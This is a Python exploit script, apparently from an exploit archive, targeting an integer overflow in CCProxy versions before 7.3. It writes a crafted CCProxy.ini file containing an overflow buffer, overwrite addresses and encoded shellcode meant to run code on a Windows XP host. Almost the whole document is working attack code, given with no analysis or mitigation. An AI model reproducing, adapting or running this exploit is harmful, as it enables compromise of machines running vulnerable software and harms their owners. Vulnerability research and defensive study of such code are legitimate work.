#!/usr/bin/env python
 
# Exploit Title: CCProxy v7.3 Integer Overflow Exploit
# Date: 2013/03/22
# Author: Mr.XHat
# E-Mail: Mr.XHat {AT} GMail.com
# Vendor Homepage: http://www.youngzsoft.net/
# Software Link: http://user.youngzsoft.com/ccproxy/update/ccproxysetup.exe
# Version: Prior To 7.3
# Discovered By: Mr.XHat
# Tested On: WinXP SP3 EN
 
hdr = "[System]"
hdr += "\x0d\x0a"
hdr += "Ver=7.3"
hdr += "\x0d\x0a"
hdr += "Language="
 
# EAX: 0x41414131
buf = "\x41" * 1028
gdt1 = "\x04\xB4\x12\x00"
pad1 = "\x41" * 4
gdt2 = "\xF4\xB3\x12\x00"
pad2 = "\x41" * 12
gdt3 = "\x04\xB4\x12\x00"
 
sc = (
# Avoid: '\x00\xff\xf5'
"\x6a\x32\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xba" +
"\xb3\x5c\xb6\x83\xeb\xfc\xe2\xf4\x46\x5b\xd5\xb6\xba\xb3" +
"\x3c\x3f\x5f\x82\x8e\xd2\x31\xe1\x6c\x3d\xe8\xbf\xd7\xe4" +
"\xae\x38\x2e\x9e\xb5\x04\x16\x90\x8b\x4c\x6d\x76\x16\x8f" +
"\x3d\xca\xb8\x9f\x7c\x77\x75\xbe\x5d\x71\x58\x43\x0e\xe1" +
"\x31\xe1\x4c\x3d\xf8\x8f\x5d\x66\x31\xf3\x24\x33\x7a\xc7" +
"\x16\xb7\x6a\xe3\xd7\xfe\xa2\x38\x04\x96\xbb\x60\xbf\x8a" +
"\xf3\x38\x68\x3d\xbb\x65\x6d\x49\x8b\x73\xf0\x77\x75\xbe" +
"\x5d\x71\x82\x53\x29\x42\xb9\xce\xa4\x8d\xc7\x97\x29\x54" +
"\xe2\x38\x04\x92\xbb\x60\x3a\x3d\xb6\xf8\xd7\xee\xa6\xb2" +
"\x8f\x3d\xbe\x38\x5d\x66\x33\xf7\x78\x92\xe1\xe8\x3d\xef" +
"\xe0\xe2\xa3\x56\xe2\xec\x06\x3d\xa8\x58\xda\xeb\xd0\xb2" +
"\xd1\x33\x03\xb3\x5c\xb6\xea\xdb\x6d\x3d\xd5\x34\xa3\x63" +
"\x01\x43\xe9\x14\xec\xdb\xfa\x23\x07\x2e\xa3\x63\x86\xb5" +
"\x20\xbc\x3a\x48\xbc\xc3\xbf\x08\x1b\xa5\xc8\xdc\x36\xb6" +
"\xe9\x4c\x89\xd5\xdb\xdf\x3f\x98\xdf\xcb\x39\xb6"
)
 
exp = hdr+buf+gdt1+pad1+gdt2+pad2+gdt3+sc
file = open("CCProxy.ini", "w")
file.write(exp)
file.close()
